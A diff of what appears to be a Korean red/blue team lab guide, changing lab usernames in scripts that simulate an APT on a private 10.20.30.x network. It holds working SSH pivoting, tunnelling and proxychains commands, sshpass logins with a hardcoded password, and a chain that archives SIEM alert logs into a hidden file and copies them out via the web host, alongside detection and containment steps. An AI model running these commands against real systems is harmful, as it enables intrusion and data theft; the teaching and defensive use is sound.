@@ -141,15 +141,15 @@ web 서버 (10.20.30.80)  ← 1차 거점
 siem 서버 (10.20.30.100) ← 2차 목표
 
 방법 1: SSH 직접 연결
-  ssh -J web@10.20.30.80 siem@10.20.30.100
+  ssh -J ccc@10.20.30.80 ccc@10.20.30.100
 
 방법 2: SSH 터널
-  ssh -L 2222:10.20.30.100:22 web@10.20.30.80
+  ssh -L 2222:10.20.30.100:22 ccc@10.20.30.80
   ssh -p 2222 siem@localhost
 
 방법 3: 프록시체인
-  ssh -D 1080 web@10.20.30.80
-  proxychains ssh siem@10.20.30.100
+  ssh -D 1080 ccc@10.20.30.80
+  proxychains ssh ccc@10.20.30.100
 ```
 
 ### 횡적 이동 탐지
@@ -258,7 +258,7 @@ echo ""
 
 # SSH 접근
 echo "[2b] SSH 접근"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
   "echo 'SHELL: web@$(hostname) ($(whoami))'" 2>/dev/null || echo "SSH 접근 실패"
 
 echo "[$(date +%H:%M:%S)] Phase 1-2 완료"
@@ -290,7 +290,7 @@ echo "[$(date +%H:%M:%S)] Phase 3-4 시작"
 
 # Phase 3: 권한 상승 탐색
 echo "[Phase 3] 권한 상승"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'PRIVESC'
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 << 'PRIVESC'
 echo "현재 사용자: $(whoami)"
 echo ""
 echo "[sudo 확인]"
@@ -315,15 +315,15 @@ PRIVESC
 echo ""
 echo "[Phase 4] 횡적 이동"
 echo "[SSH 피벗] web → siem 시도"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
-  "sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+  "sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.100 \
    'echo PIVOT: siem@\$(hostname) 접근 성공' 2>/dev/null" 2>/dev/null || \
   echo "피벗 실패: siem 접근 불가"
 
 # secu 서버 접근 시도
 echo "[SSH 피벗] web → secu 시도"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
-  "sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+  "sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.1 \
    'echo PIVOT: secu@\$(hostname) 접근 성공' 2>/dev/null" 2>/dev/null || \
   echo "피벗 실패: secu 접근 불가"
 
@@ -357,30 +357,30 @@ echo "[$(date +%H:%M:%S)] Phase 5 시작 — 데이터 유출"
 
 # siem에서 보안 로그 수집 (피벗 경유)
 echo "[수집] siem 보안 로그"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
-  "sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+  "sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.100 \
    'ls -la /var/ossec/logs/ 2>/dev/null | head -10; \
     wc -l /var/ossec/logs/alerts/alerts.log 2>/dev/null' 2>/dev/null" 2>/dev/null || \
   echo "siem 데이터 접근 실패"
 
 # 데이터 압축 (siem에서)
 echo "[압축] 데이터 압축"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
-  "sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
+  "sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.100 \
    'tar czf /tmp/.data.tar.gz /var/ossec/logs/alerts/ 2>/dev/null && \
     echo 압축 완료: \$(ls -lh /tmp/.data.tar.gz | awk \"{print \\\$5}\")' 2>/dev/null" 2>/dev/null || \
   echo "압축 실패"
 
 # 유출 시도 (siem → web → bastion)
 echo "[유출] siem → web 전송"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
   "sshpass -p1 scp -o StrictHostKeyChecking=no \
-   siem@10.20.30.100:/tmp/.data.tar.gz /tmp/.exfil.tar.gz 2>/dev/null && \
+   ccc@10.20.30.100:/tmp/.data.tar.gz /tmp/.exfil.tar.gz 2>/dev/null && \
    echo '전송 성공: web에 데이터 도착' || echo '전송 실패'" 2>/dev/null
 
 echo "[유출] web → bastion 전송"
 sshpass -p1 scp -o StrictHostKeyChecking=no \
-  web@10.20.30.80:/tmp/.exfil.tar.gz /tmp/exfiltrated.tar.gz 2>/dev/null && \
+  ccc@10.20.30.80:/tmp/.exfil.tar.gz /tmp/exfiltrated.tar.gz 2>/dev/null && \
   echo "유출 성공: $(ls -lh /tmp/exfiltrated.tar.gz 2>/dev/null)" || \
   echo "유출 실패 (차단됨)"
 
@@ -417,13 +417,13 @@ echo "[$(date +%H:%M:%S)] Blue Team 다층 모니터링 시작"
 
 # Layer 1: 네트워크 수준 (secu)
 echo "[Layer 1] 네트워크 탐지"
-sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.1 \
   "tail -10 /var/log/suricata/fast.log 2>/dev/null"
 
 # Layer 2: 호스트 수준 (web)
 echo ""
 echo "[Layer 2] web 서버 탐지"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
   "echo '=== SSH 실패 ===' && grep -c 'Failed' /var/log/auth.log 2>/dev/null; \
    echo '=== SSH 성공 ===' && grep 'Accepted' /var/log/auth.log 2>/dev/null | tail -5; \
    echo '=== 현재 연결 ===' && ss -tn 2>/dev/null | head -10"
@@ -431,14 +431,14 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
 # Layer 3: 횡적 이동 탐지 (siem)
 echo ""
 echo "[Layer 3] siem 서버 — 횡적 이동 탐지"
-sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.100 \
   "echo '=== SSH 로그 ===' && grep -E 'Accepted|Failed' /var/log/auth.log 2>/dev/null | tail -5; \
    echo '=== 의심 연결 ===' && ss -tn 2>/dev/null | grep -v ':443' | head -5"
 
 # Layer 4: 데이터 유출 탐지
 echo ""
 echo "[Layer 4] 데이터 유출 탐지"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
   "echo '=== 최근 생성 파일 ===' && find /tmp -mmin -30 -type f 2>/dev/null; \
    echo '=== 비정상 프로세스 ===' && ps aux 2>/dev/null | grep -E 'scp|curl|nc|base64' | grep -v grep"
 
@@ -472,26 +472,26 @@ echo "[$(date +%H:%M:%S)] APT 대응 시작"
 
 # 1. web 서버 외부 통신 차단 (1차 거점 격리)
 echo "[격리 1] web 외부 통신 차단"
-# sshpass -p1 ssh secu@10.20.30.1 \
+# sshpass -p1 ssh ccc@10.20.30.1 \
 #   "echo 1 | sudo -S nft add rule inet filter forward ip saddr 10.20.30.80 ip daddr != 10.20.30.0/24 drop"
 echo "(시뮬레이션) web 외부 통신 차단"
 
 # 2. web→siem 피벗 경로 차단
 echo "[격리 2] web→siem SSH 차단"
-# sshpass -p1 ssh siem@10.20.30.100 \
+# sshpass -p1 ssh ccc@10.20.30.100 \
 #   "echo 1 | sudo -S nft add rule inet filter input ip saddr 10.20.30.80 tcp dport 22 drop"
 echo "(시뮬레이션) web→siem SSH 차단"
 
 # 3. 공격자 세션 종료
 echo "[봉쇄] 의심 세션 종료"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
   "who 2>/dev/null"
 
 # 4. 유출 데이터 삭제
 echo "[근절] 유출 준비 파일 제거"
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.80 \
   "find /tmp -name '.*' -newer /tmp -type f 2>/dev/null"
-sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \
+sshpass -p1 ssh -o StrictHostKeyChecking=no ccc@10.20.30.100 \
   "find /tmp -name '.*' -newer /tmp -type f 2>/dev/null" 2>/dev/null
 
 # 5. 비밀번호 일괄 변경
